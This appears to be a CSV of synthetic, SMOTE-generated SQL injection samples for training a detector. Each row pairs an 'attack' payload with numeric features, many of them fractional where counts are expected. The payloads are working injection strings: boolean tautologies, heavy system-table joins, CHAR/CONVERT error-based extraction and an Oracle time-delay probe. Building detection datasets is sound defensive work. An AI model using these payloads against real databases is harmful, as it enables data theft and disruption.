id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,1.3754700015616295,132.85856179026746,29.890437336215566,3.999007054015774,66.18724978162075,10.374499563241512,41.0,15.296812445405187,0.49854507617980637,0.07705218633781065,0.3091930869417532,0.11520965054062984,0.0,0.296812445405189,2.0,0.0,1.0,1.296812445405189,0.0,5.703187554594812,0.0,0.0,2.0,4.296812445405189,0.0,0.2968124454051891,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.2968124454051891,1.0,0.703187554594811,0.29681244540518914,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.296812445405189
SMOTE_000002,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,1.716660831205256,123.08851238749521,29.933392780921807,3.8571161403999183,54.73267940986011,10.177916488817553,42.55565463486968,15.622261853947872,0.4376153867994901,0.08514750725563797,0.34905218040950564,0.12818492553536626,0.9333927809218088,0.0,2.0,0.3111309269739362,0.6888690730260638,1.0,0.0,6.933392780921808,0.0,0.0,1.6888690730260638,4.0,0.31113092697393624,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.6888690730260637,0.0,0.0,0.6888690730260638,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3777381460521276
SMOTE_000003,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000016,0.7021325487691633,141.87774223587948,32.97806211296407,4.133412727720983,66.1880714252283,16.85580434884356,42.4670931694461,16.36677329236153,0.46639406293610697,0.11884328946966906,0.2993876634896757,0.11537498410454824,0.36677329236152634,0.8777422358794913,2.0,0.1222577641205087,0.8777422358794913,2.0,0.0,5.489031056482035,0.0,0.0,1.8777422358794913,5.1222577641205085,0.1222577641205087,0.8777422358794914,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.8777422358794913,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8777422358794915
SMOTE_000004,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000024,1.2963840236088315,390.6856042808606,31.0,3.2853863087437696,100.17043852774549,50.458352910533286,185.0,55.056812842581834,0.25638418403449303,0.12916907723010077,0.4735272031480149,0.14091953558739131,2.742417123442441,0.0,0.3143957191393898,0.0,0.0,3.0,0.0,38.0,0.0,0.0,1.0,13.314395719139391,0.6856042808606102,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,1.6856042808606102,0.3143957191393898,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000005,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000013,0.39577501630344747,371.2723088669411,31.0,3.412554040930066,96.42410295564703,57.33355249826896,166.21172273042006,51.30293068260502,0.2596998440752268,0.15454220301428723,0.4475938788083925,0.13816407410209347,0.24234454608401546,0.0,2.8182415904369886,0.0,0.0,3.0,0.0,34.24234454608401,0.0,0.0,1.0,15.818241590436989,0.060586136521003864,0.0,0.9394138634789961,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.939413863478996,0.0,0.12117227304200773,0.9394138634789961,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000006,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000007,1.364170127547969,50.939615177542464,18.61634598128539,3.562529233448754,9.262884373799544,19.030192411228764,16.64653839251416,6.0,0.17896253360793343,0.3761362243411354,0.3267705151734746,0.11813072687745646,0.0,0.32326919625707856,2.676730803742921,0.0,0.0,2.0,0.0,1.0,0.0,0.0,-2.220446049250313e-16,4.676730803742921,0.0,0.32326919625707873,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.32326919625707873,0.6767308037429214,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000007,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000010,1.0884839663272712,40.09453120571706,16.260937490838018,3.03152758133509,3.4203124969460035,10.471093739311018,18.521874981676042,7.681249987784021,0.08637116306209755,0.2624493026541181,0.4650939542882875,0.18608557999549685,1.6304687454190083,0.0,1.7898437515269974,0.0,0.21015624847300274,1.2101562484730026,0.0,2.4203124969460053,0.4203124969460055,0.0,-2.220446049250313e-16,3.2101562484730026,1.0,0.0,0.7898437515269972,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.2101562484730028,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2101562484730026
SMOTE_000008,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000020,1.865658448876255,208.80618417323763,30.096907913381187,3.5219785988281944,95.9175161910087,16.113404675179446,70.21031258856064,26.564950718488856,0.45745358655880874,0.07774972979674578,0.33705259927919706,0.12774408436524837,4.0,0.0,0.0,0.0,0.7257730216547036,2.0,0.0,10.742269783452965,2.0,0.2742269783452965,5.177319064964111,4.3711348917264825,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.2742269783452965,0.7257730216547035,0.0,0.0,0.7257730216547036,1.2742269783452964,0.7257730216547035,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3711348917264825,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.82268093503589
SMOTE_000009,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000003,4.725000346354144,33.054021262524145,13.899268861359248,2.8673978843032164,5.248172153398116,5.852558985242631,15.953290123883384,6.0,0.17667492986506445,0.1636559942266109,0.47285048680027864,0.18681858910804597,0.5503655693203762,0.44963443067962394,0.0,0.8992688613592478,0.449634430679624,0.550365569320376,0.0,2.550365569320375,0.5503655693203761,0.0,-2.220446049250313e-16,1.8992688613592472,0.5503655693203761,0.44963443067962394,0.0,0.0,0.44963443067962394,0.5503655693203761,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5503655693203761,0.44963443067962405,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000010,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou",nearest_attack_euclidean,R000014,2.2105313086219476,140.85169435808876,33.371186415915055,3.8518307114049652,53.25338944668337,11.572033960212359,53.54152528753281,22.484745663660227,0.3701242592185531,0.08710547332856468,0.3836005771939311,0.15916969025895106,3.0,0.0,0.6288135840849435,0.3144067920424718,0.0,0.3144067920424718,0.0,11.056779623872584,0.0,1.3711864159150564,1.0,5.371186415915057,1.0,0.0,0.3144067920424718,0.0,0.0,0.3144067920424718,1.0,0.0,0.0,0.0,0.6855932079575283,0.6855932079575282,0.0,0.0,0.6855932079575282,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.371186415915057
